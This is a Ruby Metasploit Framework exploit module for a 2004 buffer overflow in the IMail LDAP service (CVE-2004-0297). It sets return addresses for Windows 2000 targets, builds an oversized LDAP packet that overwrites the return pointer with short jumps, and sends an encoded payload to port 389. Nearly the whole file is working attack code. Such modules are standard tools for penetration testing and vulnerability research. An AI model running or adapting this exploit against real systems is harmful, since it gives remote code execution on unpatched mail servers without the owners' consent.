##
# $Id: imail_thc.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \\\'msf/core\\\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\\\'Name\\\'           => \\\'IMail LDAP Service Buffer Overflow\\\',
			\\\'Description\\\'    => %q{
					This exploits a buffer overflow in the LDAP service that is
				part of the IMail product. This module was tested against
				version 7.10 and 8.5, both running on Windows 2000.
			},
			\\\'Author\\\'         => [ \\\'hdm\\\' ],
			\\\'License\\\'        => MSF_LICENSE,
			\\\'Version\\\'        => \\\'$Revision: 9179 $\\\',
			\\\'References\\\'     =>
				[
					[ \\\'CVE\\\', \\\'2004-0297\\\'],
					[ \\\'OSVDB\\\', \\\'3984\\\'],
					[ \\\'BID\\\', \\\'9682\\\'],
					[ \\\'URL\\\', \\\'http://secunia.com/advisories/10880/\\\'],
				],
			\\\'Privileged\\\'     => false,
			\\\'Payload\\\'        =>
				{
					\\\'Space\\\'    => 1024,
					\\\'BadChars\\\' => \\\"\\\\x00\\\\x0a\\\\x0d\\\\x20\\\",
				},
			\\\'Platform\\\'       => \\\'win\\\',
			\\\'Targets\\\'        =>
				[
					[\\\"Windows 2000 English\\\",   { \\\'Ret\\\' => 0x75023386 }],
					[\\\"Windows 2000 IMail 8.x\\\", { \\\'Ret\\\' => 0x1002a619 }],
				],
			\\\'DisclosureDate\\\' => \\\'Feb 17 2004\\\',
			\\\'DefaultTarget\\\' => 0))

		register_options(
			[
				Opt::RPORT(389)
			], self.class)
	end

	def exploit
		connect

		buf = \\\"\\\\x30\\\\x82\\\\x0a\\\\x3d\\\\x02\\\\x01\\\\x01\\\\x60\\\\x82\\\\x01\\\\x36\\\\x02\\\\xff\\\\xff\\\\xff\\\\xff\\\\x20\\\"
		buf << \\\"\\\\xcc\\\" * 5000

		# Universal exploit, targets 6.x, 7.x, and 8.x at once ;)
		# Thanks for johnny cyberpunk for 6/7 vs 8 diffs

		buf[77, 4] = \\\"\\\\xeb\\\\x06\\\"
		buf[81, 4] = [target.ret].pack(\\\'V\\\') # 6.x, 7.x
		buf[85, 4] = \\\"\\\\xeb\\\\x06\\\"
		buf[89, 4] = [target.ret].pack(\\\'V\\\') # 8.x
		buf[93, payload.encoded.length] = payload.encoded

		sock.put(buf)

		handler
		disconnect
	end

end
